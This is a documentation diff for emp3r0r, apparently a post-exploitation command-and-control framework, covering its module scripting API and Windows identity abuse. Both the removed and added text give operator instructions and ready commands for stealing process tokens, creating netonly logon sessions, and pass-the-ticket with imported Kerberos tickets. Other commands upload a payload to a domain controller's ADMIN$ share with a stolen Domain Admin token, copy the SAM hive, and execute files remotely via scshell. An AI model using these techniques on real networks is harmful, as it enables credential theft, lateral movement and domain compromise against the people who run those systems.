-`--user` is ignored when `--token` is set. There is no separate `make_token`/`import_ticket` command: the agent creates the session and imports the ticket as part of the module invocation. If a module declares its own `user`/`ticket` parameter in `config.json`, that declaration wins and the universal meaning is disabled for that module.
+| Function | Description |
+| --- | --- |
+| `sys_info()` | Dictionary of agent details (`tag`, `uuid`, `os`, `user`, `has_root`, `process`, `cwd`, ...). |
+| `uptime()`, `user()`, `container()`, `has_root()` | Target environment queries. |
+| `exec_shell(script, args=[], env=[])`, `exec_python(...)`, `exec_powershell(...)`, `exec_batch(...)` | Run a script in memory. |
+| `sign(data)` | Sign with the agent's ephemeral key. |
+| `tag()`, `uuid()` | Agent identifiers. |
+| `touch_file(path)`, `fetch_file(file, peer="", path="", checksum="")` | Timestamp sync and file retrieval via the memfs/P2P/C2 pipeline. |
 
-### 6.2 How Token Impersonation Works
+### Globals
 
-```
-ModuleHandler
-  executeWithToken(sid, func(token uintptr) error {
-    // token = raw HANDLE from TokenMap, or 0 if no token set
-    ...
-  })
-```
+- `argv` — the positional arguments passed to the script.
+- `module_files` — memfs paths of companion files for multi-file modules.
+- `current_token()` — see the Windows interop table above.
 
-For **starlark modules**, each I/O builtin wraps itself with `runWithToken`:
-
-```
-starlarkReadFile(thread, ...)
-  runWithToken(thread, func() error {
-    1. LockOSThread()
-    2. NtSetInformationThread(ThreadImpersonationToken)  ← indirect syscall
-    3. os.ReadFile(path)     ← file opened with stolen identity
-    4. NtSetInformationThread(nil)   ← revert
-    5. UnlockOSThread()
-  })
-```
-
-This means **every** `read_file`, `write_file`, `list_dir`, `exists`, `mkdir`, `remove`, `win_call`, `win_alloc`, `win_free`, `win_read_mem`, `http_get`, `http_post` and `exec_cmd` call automatically runs under the stolen token when one is assigned. No extra code is needed in the starlark script.
-
-### 6.3 Using `current_token()` in Starlark Scripts
-
-When a script needs to inspect the effective identity (e.g. for whoami-style output or to pass the token to a Win32 API that requires a token handle), use the `current_token()` builtin:
+### Minimal script
 
 ```python
-def example_whoami():
-    TOKEN_QUERY = 0x0008
-
-    # Returns a handle to the current effective token.
-    # If a token was stolen and assigned to this module, this IS the stolen token.
-    h_token = current_token()
-    if h_token == 0:
-        print("[-] Failed to open current token")
-        return
-
-    # Query token information (example: TokenUser)
-    TOKEN_INFORMATION_CLASS_TokenUser = 1
-    req_size_ptr = win_alloc(4)
-    win_call("advapi32.dll", "GetTokenInformation", h_token,
-             TOKEN_INFORMATION_CLASS_TokenUser, 0, 0, req_size_ptr)
-    req_size = read_uint32(req_size_ptr, 0)
-
-    token_user_buf = win_alloc(req_size)
-    win_call("advapi32.dll", "GetTokenInformation", h_token,
-             TOKEN_INFORMATION_CLASS_TokenUser, token_user_buf, req_size, req_size_ptr)
-
-    # ... parse TOKEN_USER, resolve SID, etc.
-
-    # Always close the handle when done.
-    win_call("kernel32.dll", "CloseHandle", h_token)
+def main(*args):
+    who = args[0] if args else "World"
+    print("Hello %s!" % who)
+    return "OK"
 ```
 
-> **Important**: Always `CloseHandle` the token handle returned by `current_token()`. Each call returns a new handle.
-
-### 6.4 Token-Aware Script Examples
-
-See these reference implementations:
-
-| Script                                  | What it demonstrates                                                          |
-| --------------------------------------- | ----------------------------------------------------------------------------- |
-| `core/modules/SA/whoami.star`           | Full token inspection: user, groups, privileges. Thread-token-first fallback. |
-| `core/modules/injection/thread_inject.star` | Remote thread injection under the operator-selected token.          |
-| `core/modules/SA/get_dpapi_system.star` | Checking token elevation before attempting LSA secret extraction.             |
-| `core/modules/cifs/cifs.star` | SMB/CIFS file upload/download/deletion to and from agent-less hosts under a stolen token or an imported Kerberos ticket. |
-
-### 6.5 COFF (BOF) Modules and Tokens
-
-COFF/BOF payloads run in-process on a dedicated goroutine. When a token is assigned:
-
-1. The token handle is stored before the BOF goroutine starts.
-2. `PreExecHook` fires on the BOF goroutine: `LockOSThread` + `NtSetInformationThread(token)`.
-3. The BOF entry point (`syscall.SyscallN`) executes — any Win32 APIs called by the BOF see the impersonated identity.
-4. `PostExecHook` fires: `NtSetInformationThread(nil)` + `UnlockOSThread`.
-
-No changes are needed in the BOF source code.
-
-### 6.6 Limitations
-
-| Module type    | Token support | Notes                                                                                                   |
-| -------------- | ------------- | ------------------------------------------------------------------------------------------------------- |
-| **starlark**   | Full          | Every I/O builtin impersonates independently. `exec_cmd` spawns children via `CreateProcessWithTokenW`. |
-| **coff (BOF)** | Full          | Pre/post-exec hooks impersonate the BOF goroutine.                                                      |
-| **powershell** | None          | `exec.Command` cannot use thread tokens. A warning is logged if a token is assigned.                    |
-| **bash**       | None          | Same limitation as powershell.                                                                          |
-| **python**     | None          | Same limitation as powershell.                                                                          |
-
-> **Recommendation**: Use **starlark modules** for any token-aware operations. The starlark `win_call` builtin gives you direct access to the full Win32 API under the stolen identity.
-
-### 6.7 Privilege Requirements
-
-`steal_token` automatically enables:
-
-- `SeDebugPrivilege` — required to open handles to most processes (especially SYSTEM-level).
-- `SeImpersonatePrivilege` — required to set thread tokens and spawn children via `CreateProcessWithTokenW`.
-
-If the agent does not hold these privileges (e.g. running as a low-privilege user), warnings are logged and token operations will fail with `STATUS_ACCESS_DENIED`.
-
-### 6.8 Netlogon Logon Sessions and Kerberos Tickets
-
-Thread impersonation alone is not enough for Kerberos: `ptt`, `asktgt /ptt`, `klist`, … talk to LSA and are bound to a **logon session** (the `AuthenticationId`/LUID registered in LSASS), not to a token. BOFs/starlark modules are token-aware, so without a matching logon session ticket imports fail (`STATUS_ACCESS_DENIED`/`0xC0000022` or the ticket simply not showing up in `klist`).
-
-The `--user` option solves this by creating a **netonly netlogon (new-credentials) logon session** (the same primitive Cobalt Strike's `make_token` / `runas /netonly` use):
-
-```
-# create the session as part of any token-aware module invocation
-kerbeus_klist --user CORP.LOCAL/jdoe
-# → session name: CORP.LOCAL/jdoe, logon LUID: 0x12345678
-```
-
-Internally it calls `LogonUserW(user, domain, any_password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50)`, which registers a brand-new logon session in LSASS. **The password is never validated** — the agent always uses a dummy value. Because this is a *new-credentials* (netonly) logon, the session token keeps the **calling user's local identity** (`whoami` is unchanged) and the supplied credentials are used only for outbound network connections; what the session gives you is a fresh `AuthenticationId` (LUID) that Kerberos tickets can be bound to. The session name is derived from the user/domain pair (`DOMAIN/user` or bare `user`); the session is cached agent-side (`priv.SessionMap`) and its token is registered in `priv.TokenMap` under the session name, so **the universal `--token <session>` parameter works for any BOF/starlark module**.
-
-Typical Kerberos workflow:
-
-1. `some_module --user CORP.LOCAL/jdoe` — create the session. `--ticket <base64 kirbi>` can be added in the same invocation to import a TGT/TGS via `LsaCallAuthenticationPackage(KerbSubmitTicketMessage)` (the same mechanism as the Kerbeus `ptt` BOF, implemented in-process — no BOF needed). The session token is impersonated while LSA runs, so `SeImpersonatePrivilege` (not SYSTEM) is sufficient.
-2. Reuse the session by name on later modules:
-   - `kerbeus_asktgt --params '/user:jdoe ... /ptt' --token CORP.LOCAL/jdoe`
-   - `kerbeus_ptt --params '/ticket:...' --token CORP.LOCAL/jdoe` (imports into the impersonated session; `/luid:` optional)
-   - any starlark module with `--token CORP.LOCAL/jdoe`
-3. `list_sessions` — list all sessions (name, user, LUID).
-
-The universal `--user`/`--ticket` options mean there is no separate `make_token`/`import_ticket` step — the agent creates the session and imports the ticket as part of the module invocation:
-
-```
-kerbeus_klist --user jdoe --ticket <base64 TGT> --token jdoe
-# or, session created on the fly (no --token needed):
-kerbeus_klist --user CORP.LOCAL/jdoe --ticket <base64 TGT>
-```
-
-Notes:
-
-- After `--ticket`, outbound network access (SMB shares, RPC, …) under the session authenticates **with the imported Kerberos ticket** — this is the pass-the-ticket flow: the netlogon session is the container, the ticket is the identity. Without an imported ticket, network access falls back to the netonly credentials (a dummy password then yields `ERROR_LOGON_FAILURE (1326)` on network resources, as with Cobalt Strike's `make_token`).
-- `whoami`/token-identity BOFs still report the *current* user: the netonly token's SID never changes (PTT changes network identity, not the token SID) — exactly as with Cobalt Strike's `make_token`/`ptt`.
-- `list_tokens` also shows netlogon sessions (annotated with `[netlogon session]`), and the `--token` completer offers both SIDs and session names.
-- The session token is an impersonation duplicate of the logon token; it remains valid until the agent exits or the session is recreated under the same name.
-
-### 6.9 CIFS/SMB Uploads/Downloads to Agent-less Hosts
-
-On a domain-joined host with a Domain Admin logged in (or a DA token/ticket available in the agent session) you can push files to machines that run **no agent at all** — straight over their `ADMIN$`/`C$`/… shares — as long as the DA identity has access. This is the `cifs_upload` starlark module (same script also provides `cifs_download` for pulling files back and `cifs_rm` for cleanup):
-
-```
-cifs_upload --src memfs:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe \
-            --token S-1-5-21-...-1104        # DA token stolen via steal_token
-# …or PTT with a ticket:
-cifs_upload --user CORP.LOCAL/da --ticket <base64 KRB-CRED .kirbi> \
-            --src memfs:///stage.exe --dest \\DC01\ADMIN$\Temp\stage.exe
-```
-
-`--src` may be a `memfs:///` file staged on the agent (CC `put`/`file_downloader`), an agent-local path, or an `http(s)://` URL. How it works: the script is pure Win32 file I/O — `CreateFileW("\\target\\ADMIN$\\...")` + chunked `WriteFile` over the UNC path. Every `win_call` impersonates the module's token, so the SMB redirector opens a session for the stolen identity; with a netlogon session created via `--user` the network identity is the imported Kerberos ticket (pass-the-ticket over SMB). No agent, no `net use`, no credentials on the target — the ticket/token already present in the agent session is all that is needed for CIFS access. Pair with `scshell` to execute the uploaded file on the target (service-control lateral movement under the same token context).
-
-The `cifs_download` module is the pull half: it streams a remote file back over the share (`CreateFileW(GENERIC_READ)` + chunked `ReadFile`, bytes pulled out with `win_read_mem` and saved through the binary-safe `write_bytes` helper) into `memfs:///` (retrieve with CC `get`) or a local path — e.g. `cifs_download --src \\DC01\C$\Windows\system32\config\SAM --dest memfs:///SAM --token <DA token>`. `--verify true` re-reads the file and compares hashes to detect mid-transfer changes. Downloads run under the same token/ticket context as uploads.
-
-The `cifs_rm` module is the cleanup half of the trio: it removes a remote file or an empty directory (`cifs_rm --dest \\DC01\ADMIN$\Temp\stage.exe` / `--rmdir true`) over the share under the same token/ticket context (`DeleteFileW`/`RemoveDirectoryW`, verified by re-opening the path).
+The script may return a string; the agent prints it to the operator.
 
 ---
 
-#### G. Agent Interop & Proxy APIs (`agent.*` / `agent_*`)
+## 7. Windows identity: tokens, sessions, and tickets
 
-| API Function / Method                             | Parameters                                          | Description                                                                                                       |
-| :------------------------------------------------ | :-------------------------------------------------- | :---------------------------------------------------------------------------------------------------------------- |
-| `agent.sys_info` / `agent_sys_info`               | `()`                                                | Returns a dictionary containing system details (`tag`, `uuid`, `os`, `user`, `has_root`, `process`, `cwd`, etc.). |
-| `agent.uptime` / `agent_uptime`                   | `()`                                                | Returns target system uptime string.                                                                              |
-| `agent.user` / `agent_user`                       | `()`                                                | Returns dictionary with `user` and `groups` strings.                                                              |
-| `agent.container` / `agent_container`             | `()`                                                | Returns container runtime environment if running inside a container, or empty string.                             |
-| `agent.has_root` / `agent_has_root`               | `()`                                                | Returns `True` if running with root privileges, `False` otherwise.                                                |
-| `agent.exec_shell` / `agent_exec_shell`           | `(script, args=[], env=[])`                         | Executes shell script in memory.                                                                                  |
-| `agent.exec_python` / `agent_exec_python`         | `(script, args=[], env=[])`                         | Executes Python script in memory.                                                                                 |
-| `agent.exec_powershell` / `agent_exec_powershell` | `(script, args=[], env=[])`                         | Executes PowerShell script in memory on Windows targets.                                                          |
-| `agent.exec_batch` / `agent_exec_batch`           | `(script, args=[], env=[])`                         | Executes Batch script in memory on Windows targets.                                                               |
-| `agent.sign` / `agent_sign`                       | `(data)`                                            | Signs data string or bytes with agent's ephemeral private key.                                                    |
-| `agent.tag` / `agent_tag`                         | `()`                                                | Returns agent tag string.                                                                                         |
-| `agent.uuid` / `agent_uuid`                       | `()`                                                | Returns agent UUID string.                                                                                        |
-| `agent.touch_file` / `agent_touch_file`           | `(path)`                                            | Restores/synchronizes timestamps on target file.                                                                  |
-| `agent.fetch_file` / `agent_fetch_file`           | `(file_to_download, peer="", path="", checksum="")` | Downloads file via memfs/P2P/C2 pipeline. Returns bytes if `path` is empty, or saves to `path`.                   |
+emp3r0r can run modules under another Windows identity. Three universal
+options are injected into every token-aware module (`starlark`, `coff`, and
+`dll`):
+
+| Option | Meaning |
+| --- | --- |
+| `--token <SID\|session>` | Use a stolen token (`list_tokens`) or a netlogon session (`list_sessions`). |
+| `--user <DOMAIN/user>` | Create or reuse a netonly netlogon session and run under it. Ignored when `--token` is set. |
+| `--ticket <base64 KRB-CRED>` | Import a `.kirbi` ticket into the module's session before running. |
+
+The supporting commands are:
+
+| Command | Description |
+| --- | --- |
+| `steal_token --pid <PID>` | Steal and cache a process token; enables `SeDebugPrivilege` and `SeImpersonatePrivilege`. |
+| `list_tokens` | List cached tokens and netlogon sessions. |
+| `list_sessions` | List netlogon sessions created via `--user`. |
+
+There is no separate `make_token` or `import_ticket` command: the session is
+created and the ticket imported as part of the module invocation. If a module
+declares its own `user` or `ticket` parameter, that declaration wins and the
+universal option is disabled for it.
+
+### How impersonation works
+
+- **Starlark** wraps every I/O built-in (`read_file`, `win_call`, `exec_cmd`,
+  ...) in `runWithToken`, which locks the OS thread, sets the thread token with
+  an indirect `NtSetInformationThread`, performs the operation, and reverts.
+  No code changes are needed in the script.
+- **BOF/DLL** modules run on a dedicated goroutine. A pre-exec hook sets the
+  thread token and a post-exec hook clears it, so any Win32 call the BOF makes
+  sees the impersonated identity.
+- **bash/python/powershell** cannot use thread tokens. Assigning one logs a
+  warning; use a Starlark module instead.
+
+### Netlogon sessions and pass-the-ticket
+
+Kerberos APIs (`ptt`, `asktgt`, `klist`) are bound to a logon session in
+LSASS, not to a token. `--user` creates a *netonly* (new-credentials) logon
+session, the same primitive as Cobalt Strike's `make_token` or
+`runas /netonly`. The password is never validated — the agent uses a dummy
+value — and the session's token keeps the caller's local identity while
+lending the supplied credentials to outbound network connections.
+
+Typical pass-the-ticket flow:
+
+```text
+kerbeus_klist --user CORP.LOCAL/jdoe --ticket <base64 TGT>
+kerbeus_asktgt --params '/user:jdoe ... /ptt' --token CORP.LOCAL/jdoe
+```
+
+The first line creates the session and imports the ticket; later modules reuse
+the session by name. Without an imported ticket, network access falls back to
+the netonly credentials and fails with `ERROR_LOGON_FAILURE` against remote
+resources, exactly as with `make_token`.
+
+### SMB/CIFS to agent-less hosts
+
+The `cifs` suite uses this model to move files straight onto machines that run
+no agent, over their `ADMIN$`/`C$` shares:
+
+```text
+cifs_upload --src memfs:///stage.exe --dest '\\DC01\ADMIN$\Temp\stage.exe' \
+  --token <DA token>
+cifs_download --src '\\DC01\C$\Windows\system32\config\SAM' \
+  --dest memfs:///SAM --user CORP.LOCAL/da --ticket <base64 kirbi>
+cifs_rm --dest '\\DC01\ADMIN$\Temp\stage.exe'
+```
+
+Every `CreateFileW`/`WriteFile` call impersonates the assigned token, so the
+SMB redirector authenticates with the stolen identity or the imported ticket.
+Pair with `scshell` to execute an uploaded file on the target.
+
+---
+
+## 8. Examples to copy from
+
+| Module | Demonstrates |
+| --- | --- |
+| `hello_linux` | Minimal Linux BOF and `config.json`. |
+| `procinfo` | Minimal Starlark module that reads `/proc`. |
+| `SA/` | A suite of Windows Starlark modules, including token inspection in `whoami.star`. |
+| `cifs/` | Token/ticket-aware SMB I/O. |
+| `kkyum/` | Multi-file Starlark module loading a kernel driver from a companion `.sys` cached in memfs. |
+| `injection/` | Remote thread injection under an operator-selected token. |
+| `loader_windows/` | A local C2 module that builds a self-unpacking loader. |
